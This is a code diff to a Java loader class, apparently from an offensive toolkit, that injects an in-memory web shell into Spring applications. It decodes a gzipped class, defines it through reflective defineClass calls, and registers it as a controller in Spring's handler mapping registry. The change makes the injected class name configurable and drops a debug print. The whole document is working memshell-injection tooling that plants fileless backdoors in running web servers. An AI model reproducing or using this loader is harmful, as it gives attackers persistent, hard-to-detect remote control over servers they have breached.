@@ -18,11 +18,12 @@ import java.util.zip.GZIPInputStream;
  */
 @Middleware(Middleware.Spring)
 @MemShell(MemShell.Controller)
-@JavaClassModifiable({JavaClassModifiable.PATH, JavaClassModifiable.NAME})
+@JavaClassModifiable({JavaClassModifiable.PATH, JavaClassModifiable.NAME, JavaClassModifiable.CLASSNAME})
 public class SpringContextLoader {
     private static String gzipObject;
     private static String PATH;
     private static String NAME;
+    private static String CLASSNAME;
 
     static {
         try {
@@ -40,8 +41,6 @@ public class SpringContextLoader {
 
         Object mappingRegistry = invokeMethod(Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping"), mapping, "getMappingRegistry", new Class[]{}, new Object[]{});
 
-        System.out.println(NAME);
-
         Map urlLookup = (Map) getFieldValue(mappingRegistry, "nameLookup");
         for (Object urlPath : urlLookup.keySet()) {
             if (NAME.equals(urlPath)) {
@@ -57,7 +56,7 @@ public class SpringContextLoader {
         try {
             clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
         } catch (Exception e) {
-            clazz = classLoader.loadClass("com.ppp.middleware.memshell.ControllerExec");
+            clazz = classLoader.loadClass(CLASSNAME);
         }
         Constructor constructor = clazz.getDeclaredConstructor();
         constructor.setAccessible(true);
